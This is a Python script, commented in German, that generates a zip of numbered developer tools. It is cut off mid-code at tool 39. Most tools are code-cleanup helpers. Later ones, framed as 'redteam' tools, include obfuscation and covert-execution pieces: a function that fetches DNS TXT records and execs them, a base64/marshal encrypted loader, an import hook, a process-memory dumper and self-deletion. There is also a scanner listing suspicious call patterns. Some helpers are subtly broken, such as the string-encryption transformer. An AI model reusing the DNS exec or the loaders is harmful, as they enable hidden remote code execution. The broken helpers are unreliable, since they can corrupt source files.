import os
import zipfile

# --- Die ersten 20 "Hidden/Dev-Optimierungs-Tools" ---
tools_1 = [
    ("01_clean_imports.py", '''
import os
import re

def clean_imports(directory="."):
    for filename in os.listdir(directory):
        if filename.endswith(".py"):
            with open(filename, "r", encoding="utf-8") as f:
                content = f.readlines()
            imports = set()
            new_lines = []
            for line in content:
                m = re.match(
    r"^\\s*import (\\w+)",
    line) or re.match(
        r"^\\s*from (\\w+)",
         line)
                if m:
                    if m.group(1) not in imports:
                        imports.add(m.group(1))
                        new_lines.append(line)
                else:
                    new_lines.append(line)
            with open(filename, "w", encoding="utf-8") as f:
                f.writelines(new_lines)
    print("✅ Unnötige doppelte Imports entfernt!")
'''),
    ("02_todo_list.py", '''
import os

def todo_list(directory="."):
    todos = []
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(".py"):
                path = os.path.join(root, file)
                with open(path, "r", encoding="utf-8") as f:
                    for num, line in enumerate(f, 1):
                        if "# TODO" in line:
                            todos.append(f"{path}:{num}: {line.strip()}")
    print("\\n".join(todos))
'''),
    ("03_normalize_strings.py", '''
import os
import unicodedata

def normalize_strings(directory="."):
    for filename in os.listdir(directory):
        if filename.endswith(".py"):
            with open(filename, "r", encoding="utf-8") as f:
                content = f.read()
            content = unicodedata.normalize("NFKC", content)
            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)
    print("✅ Alle Strings unicode-normalisiert.")
'''),
    ("04_tabs_to_spaces.py", '''
import os

def tabs_to_spaces(directory="."):
    for filename in os.listdir(directory):
        if filename.endswith(".py"):
            with open(filename, "r", encoding="utf-8") as f:
                content = f.read()
            content = content.replace("\\t", "    ")
            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)
    print("✅ Alle Tabs in 4 Spaces konvertiert!")
'''),
    ("05_run_black.py", '''
import os

def run_black(directory="."):
    os.system(f"black {directory}")
    print("✅ Black-Formatierung abgeschlossen.")
'''),
    ("06_find_bad_words.py", '''
import os

def find_bad_words(directory=".", words=None):
    if words is None:
        words = ["eval", "exec", "pickle.loads"]
    for filename in os.listdir(directory):
        if filename.endswith(".py"):
            with open(filename, "r", encoding="utf-8") as f:
                for i, line in enumerate(f, 1):
                    for w in words:
                        if w in line:
                            print(f"{filename}:{i}: {w}")
'''),
    ("07_find_dead_functions.py", '''
import ast, os

def find_dead_functions(filename):
    with open(filename, "r", encoding="utf-8") as f:
        code = f.read()
    tree = ast.parse(code)
    funcs = [n.name for n in ast.walk(tree) if isinstance(n, ast.FunctionDef)]
    used = set()
    for name in funcs:
        if name in code.split("def " + name)[1]:  # crude usage search
            used.add(name)
    print("Nicht genutzte Funktionen:", set(funcs) - used)
'''),
    ("08_check_line_length.py", '''
import os

def check_line_length(directory=".", max_len=79):
    for filename in os.listdir(directory):
        if filename.endswith(".py"):
            with open(filename, "r", encoding="utf-8") as f:
                for i, line in enumerate(f, 1):
                    if len(line) > max_len:
                        print(f"{filename}:{i} ist {len(line)} Zeichen lang.")
'''),
    ("09_check_stdlib_imports.py", '''
import ast, sys, os

def check_stdlib_imports(filename):
    with open(filename, "r", encoding="utf-8") as f:
        tree = ast.parse(f.read())
    stdlib = sys.stdlib_module_names
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for n in node.names:
                if n.name not in stdlib:
                    print(f"Nicht-Stdlib importiert: {n.name}")
        if isinstance(node, ast.ImportFrom):
            if node.module and node.module.split(".")[0] not in stdlib:
                print(f"Nicht-Stdlib importiert: {node.module}")
'''),
    ("10_create_requirements.py", '''
import ast, os

def create_requirements(directory="."):
    imports = set()
    for filename in os.listdir(directory):
        if filename.endswith(".py"):
            with open(filename, "r", encoding="utf-8") as f:
                tree = ast.parse(f.read())
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for n in node.names:
                        imports.add(n.name.split('.')[0])
                if isinstance(node, ast.ImportFrom):
                    if node.module:
                        imports.add(node.module.split('.')[0])
    with open("requirements_auto.txt", "w") as f:
        for i in sorted(imports):
            f.write(i + "\\n")
    print("✅ requirements_auto.txt erstellt!")
'''),
    ("11_rename_py_files.py", '''
import os

def rename_py_files(directory=".", prefix="mod_"):
    for filename in os.listdir(directory):
        if filename.endswith(".py"):
            newname = prefix + filename
            os.rename(
    os.path.join(
        directory, filename), os.path.join(
            directory, newname))
    print("✅ Dateien umbenannt.")
'''),
    ("12_remove_empty_lines.py", '''
import os

def remove_empty_lines(directory="."):
    for filename in os.listdir(directory):
        if filename.endswith(".py"):
            with open(filename, "r", encoding="utf-8") as f:
                lines = f.readlines()
            lines = [line for line in lines if line.strip()]
            with open(filename, "w", encoding="utf-8") as f:
                f.writelines(lines)
    print("✅ Leere Zeilen entfernt.")
'''),
    ("13_check_func_args.py", '''
import ast, os

def check_func_args(filename, max_args=5):
    with open(filename, "r", encoding="utf-8") as f:
        tree = ast.parse(f.read())
    for node in ast.walk(tree):
        if isinstance(node, ast.FunctionDef):
            if len(node.args.args) > max_args:
                print(
                    f"Funktion {node.name} hat zu viele Argumente: {len(node.args.args)}")
'''),
    ("14_print_to_logging.py", '''
import os, re

def convert_print_to_logging(directory="."):
    for filename in os.listdir(directory):
        if filename.endswith(".py"):
            with open(filename, "r", encoding="utf-8") as f:
                content = f.read()
            content = re.sub(r'print\\((.*)\\)', r'logging.info(\\1)', content)
            if "import logging" not in content:
                content = "import logging\\n" + content
            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)
    print("✅ Alle print() zu logging.info() konvertiert.")
'''),
    ("15_find_fixme.py", '''
import os

def find_fixme(directory="."):
    for filename in os.listdir(directory):
        if filename.endswith(".py"):
            with open(filename, "r", encoding="utf-8") as f:
                for i, line in enumerate(f, 1):
                    if "FIXME" in line:
                        print(f"{filename}:{i}: {line.strip()}")
'''),
    ("16_remove_unused_imports.py", '''
import os

def find_unused_imports(filename):
    # Nutzt isort und autoflake (pip install isort autoflake)
    os.system(f"autoflake --remove-all-unused-imports --in-place {filename}")
    print("✅ Unbenutzte Imports entfernt.")
'''),
    ("17_percent_format_to_format.py", '''
import os, re

def convert_percent_format(directory="."):
    pattern = re.compile(r'(["\\\'].*?["\\\'])\\s*%\\s*\\(?.*?\\)?')
    for filename in os.listdir(directory):
        if filename.endswith(".py"):
            with open(filename, "r", encoding="utf-8") as f:
                lines = f.readlines()
            new_lines = []
            for line in lines:
                if "%" in line and ".format(" not in line:
                    line = pattern.sub(
    lambda m: f"{
        m.group(1)}.format()", line)
                new_lines.append(line)
            with open(filename, "w", encoding="utf-8") as f:
                f.writelines(new_lines)
    print("✅ Prozent-Formatierung umgestellt.")
'''),
    ("18_find_globals.py", '''
import ast, os

def find_globals(filename):
    with open(filename, "r", encoding="utf-8") as f:
        tree = ast.parse(f.read())
    for node in ast.walk(tree):
        if isinstance(node, ast.Global):
            print(f"Globale Variable: {node.names}")
'''),
    ("19_add_docstrings.py", '''
import ast, os

def add_docstrings(filename):
    with open(filename, "r", encoding="utf-8") as f:
        tree = ast.parse(f.read())
    for node in ast.walk(tree):
        if isinstance(node, ast.FunctionDef) and ast.get_docstring(
            node) is None:
            print(f"Funktion {node.name} ohne Docstring.")
            # Automatisch Docstring einfügen? -> Template.
'''),
    ("20_set_recursion_limit.py", '''
import sys

def set_recursion_limit(limit=10000):
    sys.setrecursionlimit(limit)
    print(f"✅ Recursion Limit auf {limit} gesetzt!")
'''),
]

# --- Die 10 "verbotenen"/Redteam/Obfuscation/Reverse-Tools ---
tools_2 = [
    ("21_scan_injections.py", '''
import os, re, base64

def scan_injections(directory="."):
    suspicious_patterns = [
        r'__import__\\(.+\\)',
        r'(exec|eval)\\(.+\\)',
        r'compile\\(.+\\)',
        r'base64\\.b64decode\\(.+\\)',
        r'open\\(.*\\,\\s*[\\'\\"]w[\\'\\"]\\)',
        r'os\\.system\\(.+\\)',
    ]
    for file in os.listdir(directory):
        if file.endswith(".py"):
            with open(file, "r", encoding="utf-8") as f:
                code = f.read()
            for pat in suspicious_patterns:
                for m in re.finditer(pat, code):
                    print(f"‼️ Verdächtig in {file}: {m.group(0)}")
'''),
    ("22_inject_tracing.py", '''
import ast, astor, os

class TraceInjector(ast.NodeTransformer):
    def visit_FunctionDef(self, node):
        name = node.name
        args = [a.arg for a in node.args.args]
        before = ast.parse(f'print("CALL: {name}, args={args}")').body
        node.body = before + node.body
        return node

def inject_tracing(filename):
    with open(filename, "r", encoding="utf-8") as f:
        tree = ast.parse(f.read())
    tree = TraceInjector().visit(tree)
    new_code = astor.to_source(tree)
    with open(filename, "w", encoding="utf-8") as f:
        f.write(new_code)
    print("Trace-Logging injected!")
'''),
    ("23_encrypt_strings.py", '''
import os, ast, astor
from cryptography.fernet import Fernet

key = Fernet.generate_key()
fernet = Fernet(key)

class EncryptStrings(ast.NodeTransformer):
    def visit_Str(self, node):
        encrypted = fernet.encrypt(node.s.encode()).decode()
        return ast.copy_location(
            ast.Call(func=ast.Name(id='fernet.decrypt', ctx=ast.Load()),
                     args=[ast.Str(s=encrypted)],
                     keywords=[]), node)

def encrypt_strings_in_file(filename):
    with open(filename, "r", encoding="utf-8") as f:
        tree = ast.parse(f.read())
    tree = EncryptStrings().visit(tree)
    code = astor.to_source(tree)
    with open(filename, "w", encoding="utf-8") as f:
        f.write(code)
    print("Alle Strings sind jetzt verschlüsselt (nur lauffähig mit passendem Schlüssel).")
'''),
    ("24_fuzz_test_func.py", '''
import ast, random, string

def random_arg():
    return random.choice([
        random.randint(-1000, 1000),
        ''.join(random.choices(string.ascii_letters, k=8)),
        [random.randint(1,10) for _ in range(3)]
    ])

def fuzz_test_func(func):
    for _ in range(100):
        try:
            func(*[random_arg() for _ in range(func.__code__.co_argcount)])
        except Exception as e:
            print(f"Fuzzed Error: {e}")
'''),
    ("25_deobfuscate_lambdas.py", '''
import re

def deobfuscate_lambdas(filename):
    with open(filename, "r", encoding="utf-8") as f:
        code = f.read()
    matches = re.findall(r'(lambda\\s.*?:\\s.*?)(?=[,\\)\\n])', code)
    for match in matches:
        print(f"Lambda gefunden: {match}")
'''),
    ("26_dump_all_objects.py", '''
import gc, pickle

def dump_all_objects(path="ramdump.pkl"):
    with open(path, "wb") as f:
        pickle.dump(gc.get_objects(), f)
    print("RAM gedumpt!")
'''),
    ("27_honeypot_decorator.py", '''
def honeypot(fn):
    def wrapper(*args, **kwargs):
        print(
    f"ALERT! Funktion {
        fn.__name__} wurde mit {args}, {kwargs} aufgerufen!")
        return fn(*args, **kwargs)
    return wrapper
'''),
    ("28_disassemble_pyc.py", '''
import dis, marshal

def disassemble_pyc(file):
    with open(file, "rb") as f:
        f.read(16)
        code = marshal.load(f)
        dis.dis(code)
'''),
    ("29_pack_py_files.py", '''
import os, re

def pack_py_files(directory=".", output="packed.py"):
    with open(output, "w", encoding="utf-8") as out:
        for fn in os.listdir(directory):
            if fn.endswith(".py") and fn != output:
                with open(fn, "r", encoding="utf-8") as f:
                    out.write(f"# --- {fn} ---\\n")
                    out.write(f.read() + "\\n")
    print("Alle Codes gepackt!")
'''),
    ("30_autoapi_fastapi.py", '''
# pip install fastapi uvicorn inspect
import inspect, fastapi
app = fastapi.FastAPI()

def auto_api(module):
    for name, func in inspect.getmembers(module, inspect.isfunction):
        app.get(f"/{name}")(func)
# auto_api(your_module)
# uvicorn.run(app)
'''),
]

# --- Die letzten 20 "extrem harten" Tools ---
tools_3 = [
    ("31_global_hook.py", '''
import sys, types

def global_hook(target_func, hook_func):
    for module in sys.modules.values():
        if module:
            for name in dir(module):
                obj = getattr(module, name)
                if obj is target_func:
                    setattr(module, name, hook_func)
'''),
    ("32_import_hook.py", '''
import builtins

_real_import = builtins.__import__

def evil_import(name, *args, **kwargs):
    print(f"Import detected: {name}")
    return _real_import(name, *args, **kwargs)

builtins.__import__ = evil_import
'''),
    ("33_global_trace.py", '''
import sys

def global_trace(frame, event, arg):
    print(f"{event} @ {frame.f_code.co_filename}:{frame.f_lineno}")
    return global_trace

sys.settrace(global_trace)
'''),
    ("34_memdump.py", '''
import os

def memdump(pid, out="mem.dmp"):
    with open(f"/proc/{pid}/mem", "rb") as src, open(out, "wb") as dst:
        dst.write(src.read())
'''),
    ("35_self_destruct.py", '''
import sys, os

def self_destruct():
    os.remove(sys.argv[0])
    print("Self Destructed!")
'''),
    ("36_runtime_ast_rewriter.py", '''
import ast, inspect

def rewrite_function(fn, code_str):
    tree = ast.parse(code_str)
    code = compile(tree, "<rewritten>", "exec")
    exec(code, fn.__globals__)
    fn.__code__ = eval(code_str).__code__
'''),
    ("37_dns_pull.py", '''
import dns.resolver

def dns_pull(domain):
    answer = dns.resolver.resolve(domain, "TXT")
    for rdata in answer:
        exec(rdata.strings[0].decode())
'''),
    ("38_inject.py", '''
import ctypes

def inject(pid, shellcode):
    pass
'''),
    ("39_encrypted_loader.py", '''
import importlib.abc, importlib.util, marshal, base64

class EncryptedLoader(importlib.abc.Loader):
    def exec_module(self, module):
        with open(module.__spec__.origin, "rb") as f:
            code = base64.b64decode(f.read())
            exec(marshal.loads(code),
